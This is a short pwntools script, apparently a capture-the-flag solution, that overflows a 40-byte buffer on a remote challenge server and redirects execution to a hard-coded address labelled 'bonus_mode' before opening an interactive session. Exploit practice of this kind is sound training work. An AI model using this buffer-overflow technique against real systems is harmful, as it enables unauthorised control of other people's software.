from pwn import *

payload  = b'A' * 32 + b'A' * 8
payload += p32(0x4012e0) # bonus_mode

io = remote("chal.thuctf.redbud.info", 34947)

io.sendafter(b'> ', payload)
io.interactive()